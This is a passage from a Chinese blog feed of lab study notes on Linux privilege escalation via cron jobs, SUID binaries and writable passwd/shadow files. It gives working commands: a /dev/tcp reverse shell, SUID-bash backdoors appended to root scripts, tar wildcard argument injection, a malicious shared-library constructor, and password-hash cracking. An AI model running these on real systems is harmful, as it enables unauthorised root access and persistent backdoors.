&gt;&amp; /dev/tcp/主机ip/4444 0&gt;&amp;1</span><br><span class="line"><span class="comment">#意思是把自己的 shell 强制发送给 10.10.10.10 的 4444 端口</span></span><br></pre></td></tr></table></figure></li><li><p>在主机监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></li></ol><div class="table-container"><table><thead><tr><th>参数</th><th>全称</th><th>含义</th><th>作用</th></tr></thead><tbody><tr><td><strong><code>-l</code></strong></td><td><strong>Listen</strong></td><td>监听模式</td><td>告诉 <code>nc</code> 以服务端模式运行，等待别人来连接，而不是主动去连接别人</td></tr><tr><td><strong><code>-v</code></strong></td><td><strong>Verbose</strong></td><td>详细输出</td><td>让命令显示更详细的信息，比如当有客户端连接时会提示 “Connection received”，方便调试</td></tr><tr><td><strong><code>-n</code></strong></td><td><strong>Numeric-only</strong></td><td>纯数字模式</td><td><strong>不进行 DNS 解析</strong>。如果对方域名是 <code>pc-123.example.com</code>，它不会去查询域名，直接显示 IP，这样速度更快，也避免 DNS 泄露</td></tr><tr><td><strong><code>-p</code></strong></td><td><strong>Port</strong></td><td>指定端口</td><td>明确指定要监听的端口号。后面紧跟的 <code>4444</code> 就是端口号</td></tr><tr><td><strong><code>4444</code></strong></td><td></td><td>端口号</td><td>监听的 TCP 端口。4444 是 Metasploit 等工具的默认端口，在渗透测试中很常用</td></tr></tbody></table></div><ol><li>等待corn任务执行，主机的终端就变成了靶机的 <code>root@RedteamNotes:~#</code></li></ol><h3 id="写文件获得持久shell"><a href="#写文件获得持久shell" class="headerlink" title="写文件获得持久shell"></a>写文件获得持久shell</h3><ol><li><p><strong>追加恶意代码</strong>：千万不要用 <code>&gt;</code> 覆盖破坏原有逻辑，使用 <code>&gt;&gt;</code> 将反弹 Shell 或 SUID 后门追加到脚本末尾：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27;</span> &gt;&gt; /usr/local/bin/cleanup.sh</span><br></pre></td></tr></table></figure></li><li><p>一分钟后，去 <code>/tmp</code> 目录看看有没有多出一个带有 <code>s</code> 权限的 <code>rootbash</code>。如果有：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p <span class="comment">#-p 代表 privileged，作用是维持root权限</span></span><br></pre></td></tr></table></figure><p>这样就获得root了</p></li></ol><h3 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h3><p>细心的人可能会发现，为什么用corn来提权和别的都不太一样呢，别的直接su root就好了，为什么这个还要反弹shell呢</p><p><strong>因为：</strong></p><p>你现在通过 SSH 或者 WebShell 连进靶机，看着一个黑框框在敲命令，这个黑框框叫做<strong>当前终端（TTY）</strong>。</p><p>但是，Cron（计划任务）是在系统最深处的后台运行的，它<strong>完全不跟你当前的终端沾边</strong>。如果 Cron 在后台以 root 身份执行了 <code>whoami</code> 或者弹出了一个 <code>sh</code>（Shell），<strong>它不会显示在你的屏幕上</strong>。</p><p>所以，corn提权面临的问题是：<strong>Cron 在后台拿到了 root，怎么把这个 root 传递给我们？</strong></p><p>所以我们采用<strong>反弹shell</strong>这种不太好理解的方式</p><h2 id="情况二：自动任务-PATH-环境变量提权（脚本不可写）"><a href="#情况二：自动任务-PATH-环境变量提权（脚本不可写）" class="headerlink" title="情况二：自动任务 PATH 环境变量提权（脚本不可写）"></a>情况二：自动任务 PATH 环境变量提权（脚本不可写）</h2><p>看了一下 <code>/etc/crontab</code>，发现脚本权限很严格，改不了脚本。</p><p>但是，你注意到配置文件的最上面有一行环境变量声明非常有意思： <code>PATH=/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</code>    <code>/home/user</code> 这个我们可控的低权限目录，竟然被放在了最前面！</p><p><strong>原理解析：</strong> Cron 运行时，为了寻找 <code>overwrite.sh</code> 这个命令，会按照 <code>PATH</code> 提供的目录从左到右依次寻找。因为它先搜 <code>/home/user</code>，如果我们在这个目录下放一个同名的假脚本，Cron 就会把它当成真的执行掉</p><ol><li><p>去PATH路径靠前的地方去放我们的假脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootbash</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/rootbash</span><br><span class="line"><span class="comment">#命名为同名脚本.sh</span></span><br></pre></td></tr></table></figure></li><li><p>给执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x overwrite.sh</span><br></pre></td></tr></table></figure></li><li><p>等Cron执行你放在这里的假脚本。去 <code>/tmp</code> 运行 <code>/tmp/rootbash -p</code> 拿 root 即可。</p></li></ol><h2 id="情况三：自动任务通配符提权-corn脚本中有"><a href="#情况三：自动任务通配符提权-corn脚本中有" class="headerlink" title="情况三：自动任务通配符提权 (corn脚本中有*)"></a>情况三：自动任务通配符提权 (corn脚本中有*)</h2><p><strong>背景</strong>：脚本你改不了，PATH 也很正常。但是你通过 <code>cat</code> 读取了那个以 root 身份运行的定时脚本的内容，发现它里面有这样一行做备份的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/uploads &amp;&amp; tar -cf /backup/backup.tar *</span><br></pre></td></tr></table></figure><p><strong>漏洞点</strong>：这里使用了星号通配符 <strong><code>*</code></strong>。</p><p><strong>原理解析：</strong> 当我们在命令行使用 <code>*</code> 时，Bash 会把它展开成当前目录下的<strong>所有文件名</strong>。假设目录下有三个文件：<code>a.txt</code>, <code>b.txt</code>, <code>--help</code>。那么 <code>tar -cf backup.tar *</code> 就会被系统解析成： <code>tar -cf backup.tar a.txt b.txt --help</code> </p><p><strong>系统会把名为 <code>--help</code> 的文件当成 <code>tar</code> 命令的参数给执行了</strong> 。而 <code>tar</code> 命令刚好有执行外部脚本的隐藏参数（<code>--checkpoint-action</code>）。</p><p>注意：<strong>通配符提权不仅仅适用于 <code>tar</code></strong>。像 <code>rsync</code>、<code>chown</code> 等命令如果配合 <code>*</code> 使用，同样可以通过 GTFOBins 查找到对应的参数注入方法。</p><h2 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h2><p>假设定时任务会在 <code>/var/www/html/uploads</code> 目录下执行带有 <code>*</code> 的 <code>tar</code> 命令，而我们对这个目录刚好有写权限。</p><ol><li><p>进入目标目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/uploads</span><br></pre></td></tr></table></figure></li><li><p><strong>创建恶意脚本</strong>：写一个你想让 root 执行的代码（比如反弹 shell 或者赋权 bash）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27;</span> &gt; shell.sh</span><br><span class="line"><span class="built_in">chmod</span> +x shell.sh</span><br></pre></td></tr></table></figure></li><li><p><strong>创建特殊的“参数文件” (漏洞核心)</strong>：利用 <code>touch</code> 创建两个名字极其怪异的文件，它们的名字其实是 <code>tar</code> 命令的参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="string">&quot;/var/www/html/uploads/--checkpoint=1&quot;</span></span><br><span class="line"><span class="built_in">touch</span> <span class="string">&quot;/var/www/html/uploads/--checkpoint-action=exec=sh shell.sh&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>等待Cron 执行</strong>到 <code>tar -cf backup.tar *</code> 时，Bash 将其展开为： <code>tar -cf backup.tar shell.sh --checkpoint=1 --checkpoint-action=exec=sh shell.sh</code> 于是 <code>tar</code> 命令在打包时，触发了检查点，顺便以 root 身份执行了你的 <code>shell.sh</code>。提权成功！</p></li></ol><h1 id="小tips："><a href="#小tips：" class="headerlink" title="小tips："></a>小tips：</h1><p><strong>文件权限不仅看文件本身，还要看它所在的目录</strong>。如果一个脚本是 <code>root</code> 权限的，且权限为 <code>-rwxr-xr-x</code>（你不可写），但它所在的文件夹对你开放了写权限（<code>drwxrwxrwx</code>），你可以<strong>直接把脚本删了，然后新建一个同名的恶意脚本</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;本篇讲的是第三类：计划任务漏洞提权方法&lt;/p&gt;
&lt;h1 id=&quot;基础知识及提权原理：&quot;&gt;&lt;a href=&quot;#基础知识及提权原理：&quot; </summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="corn" scheme="http://example.com/tags/corn/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权4：SUID 机制滥用 (红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%834_SUID%20%E6%9C%BA%E5%88%B6%E6%BB%A5%E7%94%A8%20(%E6%8F%90%E6%9D%83%E9%87%8D%E7%82%B9%E5%8C%BA)/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%834_SUID%20%E6%9C%BA%E5%88%B6%E6%BB%A5%E7%94%A8%20(%E6%8F%90%E6%9D%83%E9%87%8D%E7%82%B9%E5%8C%BA)/</id>
    <published>2026-03-19T23:00:00.000Z</published>
    <updated>2026-03-18T08:53:16.006Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>本篇讲的是第二类：SUID 机制滥用提权方法</p><h1 id="基础知识："><a href="#基础知识：" class="headerlink" title="基础知识："></a>基础知识：</h1><p>在 Linux 提权体系中，SUID（Set Owner User ID up on execution）是最肥的一块肉。理解了它，你就掌握了打穿一半以上靶机的钥匙。</p><h2 id="什么是suid？"><a href="#什么是suid？" class="headerlink" title="什么是suid？"></a>什么是suid？</h2><p>正常情况下，你以<strong>普通用户</strong>的身份运行一个程序，这个程序就只有<strong>普通用户</strong>的权限。</p><p>但是，如果文件的所有者（通常是 root）给这个程序设置了 <strong>SUID 权限</strong>（在 <code>ls -l</code> 的权限位中，本该是 <code>x</code> 的地方变成了 <strong><code>s</code></strong>，例如 <code>-rwsr-xr-x</code>），那么<strong>无论谁运行这个程序，程序在运行的瞬间，都会暂时获得文件所有者（root）的最高权限</strong></p><h2 id="如何寻找系统中的-SUID-文件"><a href="#如何寻找系统中的-SUID-文件" class="headerlink" title="如何寻找系统中的 SUID 文件"></a>如何寻找系统中的 SUID 文件</h2><p>手动信息收集已经说过，就是用下面的这条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>重点关注那些<strong>不该出现在这里</strong>的命令，比如 <code>find</code>, <code>vim</code>, <code>nmap</code>, <code>bash</code>, <code>cp</code>, 或者管理员自己写的脚本（如 <code>backup</code>, <code>sysinfo</code>）。</p><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：SUID-已知可执行文件提权"><a href="#情况一：SUID-已知可执行文件提权" class="headerlink" title="情况一：SUID 已知可执行文件提权"></a>情况一：SUID 已知可执行文件提权</h2><p>如果你找到的 SUID 文件是系统常见命令，直接利用其内置功能逃逸。</p><ul><li><p><strong>核心工具</strong>：GTFOBins知识库去找命令，或者去SearchSploit查内核/软件漏洞exp</p></li><li><p><strong>实例</strong>：如果 <code>/usr/bin/find</code> 有 SUID：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/find . -<span class="built_in">exec</span> /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><pre><code>  (注意：`-p` 极其关键，防止 Bash 自动降权)</code></pre></li></ul><h2 id="情况二：SUID-共享库-SO-注入提权"><a href="#情况二：SUID-共享库-SO-注入提权" class="headerlink" title="情况二：SUID 共享库 (SO) 注入提权"></a>情况二：SUID 共享库 (SO) 注入提权</h2><p><strong>利用场景</strong>：SUID 程序运行时尝试加载某个 <code>.so</code> 库文件，但该文件在指定路径下不存在。</p><p>我们可以strings 1.elf看1文件中有没有什么关键字符串，可以帮助我们确定该文件是不是共享库</p><p>或者直接运行这个可执行文件，看他有什么交互</p><ol><li><p><strong>寻找缺失库</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/local/bin/suid_tool 2&gt;&amp;1 | grep -iE <span class="string">&quot;open|no such file&quot;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>伪造恶意库 (C 代码)</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line">void <span class="function"><span class="title">inject</span></span>() &#123;</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0); </span><br><span class="line">    system(<span class="string">&quot;/bin/bash -p&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>编译并执行</strong>：将编译后的 <code>.so</code> 放在程序找不着的那个路径，运行 SUID 程序即可触发。编译代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles</span><br></pre></td></tr></table></figure></li></ol><h2 id="情况三：SUID-环境变量-PATH-劫持提权"><a href="#情况三：SUID-环境变量-PATH-劫持提权" class="headerlink" title="情况三：SUID 环境变量 PATH 劫持提权"></a>情况三：SUID 环境变量 PATH 劫持提权</h2><p><strong>利用场景</strong>：SUID 程序内部调用了其他命令（如 <code>cat</code>），但没有使用绝对路径。</p><ol><li><p><strong>伪造命令</strong>：在 <code>/tmp</code> 下写一个假 <code>cat</code>，内容为 <code>/bin/bash -p</code>。</p></li><li><p><strong>劫持路径</strong>：<code>export PATH=/tmp:$PATH</code></p></li><li><p><strong>触发</strong>：运行 SUID 程序，它会去 <code>/tmp</code> 找 <code>cat</code>，从而执行我们的 Bash。</p></li></ol><h2 id="情况四：巧用-SUID-shell-功能提权-1-（导出函数）"><a href="#情况四：巧用-SUID-shell-功能提权-1-（导出函数）" class="headerlink" title="情况四：巧用 SUID-shell 功能提权 #1 （导出函数）"></a>情况四：巧用 SUID-shell 功能提权 #1 （导出函数）</h2><p><strong>适用环境</strong>：Bash 版本 &lt; 4.2。</p><p><strong>利用原理</strong>：在旧版 Bash 中，可以定义一个和“绝对路径”长得一模一样的函数，并将其导出。当 SUID 程序内部调用如 <code>/usr/bin/service</code> 时，它会误把你的函数当成命令执行。</p><ul><li><p><strong>实战操作</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设 SUID 程序内部调用了 /usr/sbin/service</span></span><br><span class="line"><span class="keyword">function</span> /usr/sbin/service &#123; /bin/bash -p; &#125; <span class="comment"># 定义函数</span></span><br><span class="line"><span class="built_in">export</span> -f /usr/sbin/service <span class="comment"># 导出函数到环境变量</span></span><br><span class="line"><span class="comment"># 运行 SUID 程序，成功提权</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="情况五：巧用-SUID-shell-功能提权-2-调试模式-PS4"><a href="#情况五：巧用-SUID-shell-功能提权-2-调试模式-PS4" class="headerlink" title="情况五：巧用 SUID-shell 功能提权 #2 (调试模式 PS4)"></a>情况五：巧用 SUID-shell 功能提权 #2 (调试模式 PS4)</h2><p><strong>适用环境</strong>：Bash 版本 &lt; 4.4。</p><p><strong>利用原理</strong>：利用 Bash 的调试功能环境变量 <code>PS4</code>。当以调试模式运行脚本时，<code>PS4</code> 里的命令会被执行。</p><ul><li><p><strong>实战操作</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span> -i SHELLOPTS=xtrace PS4=<span class="string">&#x27;$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)&#x27;</span> /usr/local/bin/suid_target</span><br><span class="line"><span class="comment"># 然后运行生成的 /tmp/rootbash -p</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="小tips："><a href="#小tips：" class="headerlink" title="小tips："></a>小tips：</h1><ol><li><p><strong><code>-p</code> 参数是灵魂</strong>：现代 Bash 发现 eUID 与 UID 不符时会丢弃特权，必须加 <code>-p</code>。</p></li><li><p><strong>版本号很重要</strong>：手法四和手法五对 Bash 版本有硬性要求，实战前先敲 <code>bash --version</code>。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;本篇讲的是第二类：SUID 机制滥用提权方法&lt;/p&gt;
&lt;h1 id=&quot;基础知识：&quot;&gt;&lt;a href=&quot;#基础知识：&quot; class=&quot;</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="经典方法" scheme="http://example.com/tags/%E7%BB%8F%E5%85%B8%E6%96%B9%E6%B3%95/"/>
    
    <category term="SUID" scheme="http://example.com/tags/SUID/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权3：系统敏感文件权限配置缺陷提权方法(红队笔记)</title>
    <link href="http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%833_%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E7%BC%BA%E9%99%B7/"/>
    <id>http://example.com/2026/03/20/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%833_%E7%B3%BB%E7%BB%9F%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E7%BC%BA%E9%99%B7/</id>
    <published>2026-03-19T22:00:00.000Z</published>
    <updated>2026-03-18T06:38:48.023Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>b站学习完红队笔记linux提权视频做个总结和适当的补充</p><p>视频连接放在最下面了</p><p>视频里演示的提权方法可分为<strong>六大类</strong></p><p>本篇讲的是第一类：系统敏感文件权限配置缺陷提权方法</p><h1 id="基础知识及提权原理："><a href="#基础知识及提权原理：" class="headerlink" title="基础知识及提权原理："></a>基础知识及提权原理：</h1><h2 id="如何查看文件权限："><a href="#如何查看文件权限：" class="headerlink" title="如何查看文件权限："></a>如何查看文件权限：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s0m1ng@LAPTOP-EV3HBGTC:/etc$ <span class="built_in">ls</span> -la | grep <span class="string">&#x27;shadow&#x27;</span></span><br><span class="line">-rw-r-----  1 root shadow      645 Oct 28 12:58 gshadow</span><br><span class="line">-rw-r-----  1 root shadow      639 Oct 28 12:58 gshadow-</span><br><span class="line">-rw-r-----  1 root shadow      860 Apr  1  2025 shadow</span><br><span class="line">-rw-r-----  1 root shadow      760 Apr  1  2025 shadow-</span><br></pre></td></tr></table></figure><p>对我们提取有帮助的只有下面两个部分：</p><h3 id="1-核心权限位-rw-r"><a href="#1-核心权限位-rw-r" class="headerlink" title="1. 核心权限位 (-rw-r-----)"></a>1. 核心权限位 (<code>-rw-r-----</code>)</h3><p>最前面的<code>-rw-r----</code>就是我们的文件权限啦，决定了谁能对这个文件做什么。我们把它切分成 <code>1 + 3 + 3 + 3</code> 来理解：</p><ul><li><p><strong>第 1 位 (<code>-</code>)</strong>：代表文件类型。<code>-</code> 表示这是一个普通文件，如果是 <code>d</code> 则代表它是个目录 (Directory)。</p></li><li><p><strong>第 2~4 位 (<code>rw-</code>)</strong>：代表 <strong>属主权限 (User)</strong>。这里是读(<code>r</code>)和写(<code>w</code>)，没有执行(<code>x</code>)。</p></li><li><p><strong>第 5~7 位 (<code>r--</code>)</strong>：代表 <strong>属组权限 (Group)</strong>。这里是只有读(<code>r</code>)权限。</p></li><li><p><strong>第 8~10 位 (<code>---</code>)</strong>：代表 <strong>其他人权限 (Others)</strong>（我们一般连接上靶机的时候就是属于其他人）这里全是短横线，代表什么权限都没有</p></li></ul><h3 id="2-身份归属-root-shadow"><a href="#2-身份归属-root-shadow" class="headerlink" title="2. 身份归属 (root shadow)"></a>2. 身份归属 (<code>root shadow</code>)</h3><p>紧跟在数字 <code>1</code>（硬链接数，不用管）后面的是两个名字：</p><ul><li><p><strong>第一个名字 (<code>root</code>)</strong>：代表 <strong>属主/拥有者</strong>。它和权限位的 <strong>第 2~4 位</strong> 绑定。意思是：<code>root</code> 用户对这个文件有 <code>rw-</code> (读写) 权限。</p></li><li><p><strong>第二个名字 (<code>shadow</code>)</strong>：代表 <strong>属组</strong>。它和权限位的 <strong>第 5~7 位</strong> 绑定。意思是：凡是属于 <code>shadow</code> 用户组的人（还有其他用户组，并不是只有shadow），对这个文件都有 <code>r--</code> (只读) 权限。</p></li></ul><h2 id="具体原理："><a href="#具体原理：" class="headerlink" title="具体原理："></a>具体原理：</h2><p>在 Linux 系统中，用户的身份验证依赖于两个极其核心的文件：</p><ol><li><p><code>/etc/passwd</code>：记录了系统所有用户的基本信息（用户名、UID、GID、家目录、Shell）。正常权限应为 <strong>全局可读，仅 root 可写</strong> (<code>-rw-r--r--</code>)。</p></li><li><p><code>/etc/shadow</code>：记录了所有用户的密码哈希值（Hash）。正常权限应为 <strong>仅 root/shadow 组可读写</strong> (<code>-rw-r-----</code> 或 <code>-rw-------</code>)。</p></li></ol><p><strong>值得注意的是</strong>：shadow组和shadow文件是两回事，shadow文件负责存全系统用户的<strong>真实密码 Hash 值</strong>，而shadow组是一个<strong>权限层次的用户组</strong>，具体什么用户/进程<strong>属于shadow组</strong>的具体信息放在<code>/etc/group</code>里</p><p>如果管理员配置失误，打破了上述权限原则，我们就可以非常轻松地获取 root 权限。本章将详细拆解三种相关的经典提权打法。</p><h1 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h1><h2 id="情况一：shadow可读"><a href="#情况一：shadow可读" class="headerlink" title="情况一：shadow可读"></a>情况一：shadow可读</h2><p>我们就使用<code>/etc/shadow</code> 文件利用提权 (离线爆破)</p><p><img data-src="/images/ISW/Linux提权/3/查看shadow.png" alt="查看shadow"></p><p>我们看到shadow中存放的都是哈希值，前面的<code>$6$</code>代表它的加密算法是sha512</p><p>下载一个破解密码的john工具和一个密码库rockyou.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt install john -y</span><br><span class="line">wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</span><br></pre></td></tr></table></figure><p>然后我们用john破解它们俩，john会自动识别</p><p><img data-src="/images/ISW/Linux提权/3/shadow读.png" alt="shadow读"></p><p>然后回到靶机</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root <span class="comment">#切换到root，然后输入密码就好了</span></span><br></pre></td></tr></table></figure><h2 id="情况二：shadow-文件可写"><a href="#情况二：shadow-文件可写" class="headerlink" title="情况二：shadow 文件可写"></a>情况二：<code>shadow</code> 文件可写</h2><p>如果 <code>ls -la /etc/shadow</code> 显示不仅可读，甚至<strong>全局可写</strong>（即最后三位带有 <code>w</code>，例如 <code>-rw-rw-rw-</code>），那我们就根本不需要费力去爆破原密码了，直接把 root 的密码<strong>改成我们自己的密码</strong>。</p><p>注意操作之前先做备份，别一个命令输错没密码了，后边渗透也不用打了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /etc/shadow /tmp/shadow.bak</span><br></pre></td></tr></table></figure><p>1.<strong>生成新的密码 Hash</strong> 在主机上，使用系统的加密算法生成一个你知道明文的 Hash（假设我们把密码设为 <code>password123</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成 SHA-512 格式的 Hash (对应 $6$)</span></span><br><span class="line">openssl passwd -6 password123</span><br></pre></td></tr></table></figure><p>2.<strong>修改靶机的 <code>shadow</code> 文件</strong> 回到靶机，用 vim 编辑 <code>/etc/shadow</code>：</p><p>3.<strong>替换 Root Hash</strong> 找到 <code>root:</code> 后面的那一长串旧 Hash，把它删掉，替换成你在第一步生成的<strong>新 Hash</strong>。保存退出。</p><p>4.输入密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line"><span class="comment"># 输入你刚才设置的 password123</span></span><br></pre></td></tr></table></figure><h2 id="情况三：passwd可写"><a href="#情况三：passwd可写" class="headerlink" title="情况三：passwd可写"></a>情况三：<code>passwd</code>可写</h2><p><strong>利用场景：</strong> 这是靶机中最经典的设计。通过 <code>ls -l /etc/passwd</code> 发现当前用户对该文件具有写入权限（即最后三位有 <code>w</code>，例如 <code>-rw-rw-rw-</code>）。</p><p><strong>原理解析：</strong> 在 Linux 的早期版本中，密码的 Hash 其实是直接写在 <code>/etc/passwd</code> 里的。后来为了安全，才引入了 <code>shadow</code> 文件，并用一个字母 <code>x</code> 作为占位符放在 <code>passwd</code> 里（如 <code>root:x:0:0:...</code>），告诉系统：“去 shadow 里找密码”。 <strong>关键点</strong>：由于向下兼容机制，如果我们在 <code>/etc/passwd</code> 里<strong>直接写入 Hash 而不是占位符 <code>x</code></strong>，系统依然会优先读取并认可这个密码！</p><p><strong>依旧先备份</strong>,备份后开始操作</p><p><img data-src="/images/ISW/Linux提权/3/passwd写.png" alt="passwd写"></p><p>openssl不加任何参数的话就是默认使用 <strong>crypt(3)</strong> 算法（通常基于 DES）。<strong>弱</strong>，仅用于兼容老系统。</p><p>这里的openssl参数和我们上面看到的shadow文件里的$$包裹的数字是相同的</p><div class="table-container"><table><thead><tr><th>选项</th><th>示例</th><th>算法与特点</th><th>输出示例</th></tr></thead><tbody><tr><td><strong><code>-1</code></strong></td><td><code>openssl passwd -1 111</code></td><td>使用 <strong>MD5</strong> 算法。比 DES 安全，但仍不建议用于新系统。</td><td><code>$1$somesalt$cGpNGp2KfPgGgT7aXcL9S.</code></td></tr><tr><td><strong><code>-5</code></strong></td><td><code>openssl passwd -5 111</code></td><td>使用 <strong>SHA-256</strong> 算法。</td><td><code>$5$somesalt$V9Ehk6gQcF6tZz9p7JyjQzF8L8L8L8L8L8L8L8L8</code></td></tr><tr><td><strong><code>-6</code></strong></td><td><code>openssl passwd -6 111</code></td><td>使用 <strong>SHA-512</strong> 算法。<strong>推荐</strong>，现代 Linux 系统默认使用此算法。</td><td><code>$6$somesalt$9m3X2Y3Z4a5b6c7d8e9f0g1h2i3j4k5l6m7n8o9p0q1r2s3t4u5v6w7x8y9z0A1B</code></td></tr></tbody></table></div><h1 id="reference："><a href="#reference：" class="headerlink" title="reference："></a>reference：</h1><p><a 